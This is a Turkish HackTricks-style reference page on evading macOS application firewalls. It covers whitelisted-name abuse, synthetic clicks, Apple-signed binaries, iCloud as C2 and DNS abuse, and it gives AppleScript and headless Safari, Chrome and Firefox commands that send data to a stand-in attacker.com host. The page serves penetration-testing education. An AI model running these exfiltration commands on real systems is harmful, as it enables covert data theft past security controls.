# macOS Güvenlik Duvarlarını Atlatma

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Bulunan Teknikler

Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalışır bulunmuştur.

### Beyaz liste adlarını kötüye kullanma

* Örneğin, zararlı yazılımı **`launchd`** gibi iyi bilinen macOS işlemleri adlarıyla çağırma

### Sentetik Tıklama

* Güvenlik duvarı kullanıcıdan izin istediğinde zararlı yazılımın **izin ver** düğmesine tıklamasını sağlama

### **Apple imzalı ikilileri Kullanma**

* **`curl`** gibi, ayrıca **`whois`** gibi diğerleri

### İyi bilinen apple alan adları

Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alan adlarına bağlantılara izin veriyor olabilir. Ve iCloud bir C2 olarak kullanılabilir.

### Genel Atlatma

Güvenlik duvarlarını atlatmaya yönelik bazı fikirler

### İzin verilen trafiği kontrol etme

İzin verilen trafiği bilmek, potansiyel olarak beyaz listelenmiş alan adlarını veya bunlara erişime izin verilen uygulamaları belirlemenize yardımcı olacaktır
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS Kötüye Kullanımı

DNS çözümlemeleri, muhtemelen DNS sunucularına erişime izin verilecek olan **`mdnsreponder`** imzalı uygulama aracılığıyla yapılır.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tarayıcı Uygulamaları Aracılığıyla

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### İşlem enjeksiyonu aracılığıyla

Eğer **bir işleme kod enjekte edebilirseniz** ve bu işlem herhangi bir sunucuya bağlanmaya izin veriliyorsa, güvenlik duvarı korumalarını atlayabilirsiniz:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referanslar

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
